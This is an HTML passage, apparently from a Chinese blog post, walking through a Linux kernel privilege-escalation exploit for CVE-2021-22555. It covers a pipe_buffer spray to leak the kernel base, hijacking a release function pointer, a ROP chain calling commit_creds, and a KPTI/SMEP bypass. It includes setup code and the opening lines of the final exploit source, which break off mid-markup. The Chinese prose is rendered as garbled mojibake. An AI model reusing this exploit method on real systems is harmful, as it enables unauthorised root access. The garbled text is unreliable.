      <p>æ¥ä¸‹æ¥åˆ©ç”¨åˆ°<code>pipe</code>ç®¡é“ï¼Œä¸»è¦æ˜¯å…¶ä¸­<code>struct pipe_inode_info</code>çš„<code>struct pipe_buffer *bufs;</code>æ•°ç»„ï¼Œæ€»å¤§å°ä¸º<code>0x280</code>ï¼Œä½¿ç”¨<code>kmalloc-1024</code>ï¼Œæ»¡è¶³å½“å‰çš„<code>UAF</code>ï¼ˆåŒæ ·ä½¿ç”¨æ­£å¸¸çš„<code>read/write</code>å³å¯å®Œæˆç”³è¯·é‡Šæ”¾ï¼‰ã€‚å…¶ç»“æ„ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>åˆ©ç”¨å¦‚ä¸‹æ“ä½œè¯»å–<code>const struct pipe_buf_operations *ops;</code>æŒ‡é’ˆï¼Œå³å¯æ³„éœ²å†…æ ¸åŸºåœ°å€</p>
<ul>
<li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤<code>UAF</code>å¤„çš„è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥<code>UAF</code>å¯¹è±¡é‡å› <code>slub</code>çš„<code>kmalloc-1024</code>çš„<code>freelist</code>ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥<code>UAF</code>å¯¹è±¡</li>
<li>å–·å°„ <code>pipe_buffer</code>ï¼Œå°±ä¼šå°†è¯¥<code>UAF</code>å¯¹è±¡ç”³è¯·å›æ¥ï¼Œå°†<code>pipe_buffer</code>å†™å…¥åˆ°è¯¥<code>UAF</code>å¯¹è±¡ä¸Šï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œå³å¯è·å–<code>pipe_buffer</code>ä¸Šçš„æ•°æ®ï¼Œå¾—åˆ°<code>const struct pipe_buf_operations *ops;</code>æŒ‡é’ˆï¼Œå³å¯æ³„éœ²å†…æ ¸åŸºåœ°å€</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png" alt="image-20220513115154194"></p>

        <h3 id="3-åŠ«æŒç¨‹åºæ‰§è¡Œæµ"   >
          <a href="#3-åŠ«æŒç¨‹åºæ‰§è¡Œæµ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŠ«æŒç¨‹åºæ‰§è¡Œæµ" class="headerlink" title="(3)åŠ«æŒç¨‹åºæ‰§è¡Œæµ"></a>(3)åŠ«æŒç¨‹åºæ‰§è¡Œæµ</h3>
      <p>ä¹‹å‰ä¹Ÿæåˆ°è¿‡ï¼Œå½“æˆ‘ä»¬å…³é—­ç®¡é“<code>pipe</code>ä¸¤ç«¯æˆ–è€…ä»ç®¡é“<code>pipe</code>ä¸­è¯»å–å‡ºæ‰€æœ‰æ•°æ®ä¹‹åï¼Œä¼šè°ƒç”¨åˆ°<code>pipe_buf_release()</code>å‡½æ•°è¿›è¡Œæ¸…ç†ï¼Œå…¶ä¸­ä¼šè°ƒç”¨<code>struct pipe_buffer *bufs;</code>ä¸‹çš„<code>const struct pipe_buf_operations *ops;</code>å¯¹åº”å‡½æ•°è¡¨ä¸­çš„<code>release</code>å‡½æ•°æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">pipe_buf_release</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct pipe_buffer *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>sk_buff</code>æ¥åŠ«æŒåŠ«æŒ<code>ops</code>æŒ‡é’ˆå‡½æ•°è¡¨ï¼Œä¿®æ”¹å…¶ä¸­çš„<code>release</code>å‡½æ•°æŒ‡é’ˆï¼Œå®ŒæˆåŠ«æŒç¨‹åºæµã€‚å¹¶ä¸”æ­¤æ—¶çš„<code>rsi</code>å³ä¸º<code>buf</code>ä¸ºæˆ‘ä»¬çš„<code>UAF</code>å¯¹è±¡ï¼Œè€Œ<code>sk_buff</code>åˆå¯ä»¥ä½¿å¾—<code>UAF</code>å¯¹è±¡é‡Œçš„æ•°æ®å®Œå…¨å¯æ§ã€‚å¦‚æœæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å°†<code>rsp</code>åŠ«æŒä¸º<code>rsi</code>çš„<code>gadget</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œå…¨æ“æ§ç¨‹åºæµç¨‹äº†ã€‚</p>

        <h2 id="3-EXPè§£æ"   >
          <a href="#3-EXPè§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXPè§£æ" class="headerlink" title="3.EXPè§£æ"></a>3.EXPè§£æ</h2>
      <p>è¿™ä¸ªå…¶å®ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è®²çš„ï¼Œçœ‹æ‡‚æ¼æ´åˆ©ç”¨è¿‡ç¨‹å…¶å®ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºæ¥çš„ï¼Œä¸»è¦æä¸€ä¸‹æŸäº›æ¯”è¾ƒåçš„çŸ¥è¯†ç‚¹ï¼Œä¹Ÿé˜²æ­¢å¿˜è®°ã€‚</p>

        <h3 id="1-ç»‘å®šCPUåˆ†é…"   >
          <a href="#1-ç»‘å®šCPUåˆ†é…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç»‘å®šCPUåˆ†é…" class="headerlink" title="(1)ç»‘å®šCPUåˆ†é…"></a>(1)ç»‘å®šCPUåˆ†é…</h3>
      <p>é€šå¸¸æ˜¯ç”¨æ¥è¿›è¡Œå †å—åˆ†é…æ—¶æŸ¥çœ‹å †å—å†…å­˜çš„ï¼Œé˜²æ­¢å †å—ç”³è¯·çš„æ—¶å€™ä¸œä¸€ä¸ªè¥¿ä¸€ä¸ªçš„ï¼Œæ–¹ä¾¿è°ƒè¯•ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†æé«˜å †å–·å°„çš„ç¨³å®šæ€§</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bind the cpu0</span></span><br><span class="line"><span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å‘½åç©ºé—´"   >
          <a href="#2-å‘½åç©ºé—´" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‘½åç©ºé—´" class="headerlink" title="(2)å‘½åç©ºé—´"></a>(2)å‘½åç©ºé—´</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>EXP</code>åŸä½œè€…ç§°ï¼šå½“<code>IPT_SO_SET_REPLACE</code>æˆ–<code>IP6T_SO_SET_REPLACE</code>åœ¨å…¼å®¹æ¨¡å¼ä¸‹è¢«è°ƒç”¨æ—¶ï¼ˆéœ€è¦<code>CAP_NET_ADMIN</code>æƒé™ï¼‰ã€‚</p>
<p>è¿™ä¸ªåœ¨æºä»£ç <code>do_ipt_set_ctl()</code>å‡½æ•°ä¸­æœ‰æ‰€ä½“ç°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_ipt_set_ctl</span><span class="params">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="comment">//æåˆ°å½“å…¼å®¹æ¨¡å¼ä¸‹éœ€è¦CAP_NET_ADMINæƒé™</span></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è€Œç”¨æˆ·ç©ºé—´éš”ç¦»å‡ºç‹¬ç«‹çš„å‘½åç©ºé—´åå°±èƒ½æ‹¥æœ‰<code>CAP_NET_ADMIN</code>æƒé™ï¼Œæ‰€ä»¥éœ€è¦ï¼Œå…¶å®ä¹Ÿä¸æ˜¯å¤ªæ‡‚è¿™ä¸ªå¹²å•¥çš„ã€‚</p>
<p>å…¶ä»–çš„å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆäº†ï¼Œå°±æ˜¯æœ€åçš„<code>ROP</code>é“¾æ¡æ–¹é¢çš„ä¸œè¥¿ï¼Œç”±äºæœ€åè§¦å‘åŠ«æŒç¨‹åºæµçš„æ—¶å€™ï¼Œ<code>rsi</code>ä¸º<code>UAF</code>å¯¹è±¡åœ°å€ï¼Œæ‰€ä»¥åˆ©ç”¨<code>gadget</code>å…ˆè¿›è¡Œæ ˆåŠ«æŒ<code>rsp</code>ï¼Œç„¶åä½¿ç”¨åˆ©ç”¨<code>commit_creds(&amp;init_cred)</code>è·å–ROOTæƒé™ï¼Œä¹‹åä½¿ç”¨<code>SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</code>ç»•è¿‡<code>KPTI</code>å’Œ<code>SMEP</code>å³å¯ã€‚</p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006" >Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-æœ€ç»ˆEXP"   >
          <a href="#3-æœ€ç»ˆEXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æœ€ç»ˆEXP" class="headerlink" title="(3)æœ€ç»ˆEXP"></a>(3)æœ€ç»ˆEXP</h3>
      <p>ä¸»è¦æ˜¯<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory" >bsauceå¸ˆå‚…çš„EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>å’Œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >arttnba3å¸ˆå‚…çš„EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œç„¶åæ”¹å·´æ”¹å·´ï¼ŒåŠ äº†ç‚¹ä¸œè¥¿ï¼Œæ›¿æ¢äº†ä¸€ä¸‹ROPé“¾æ¡ä»€ä¹ˆçš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_SIZE 0x1000</span></span><br><span class="line"><span 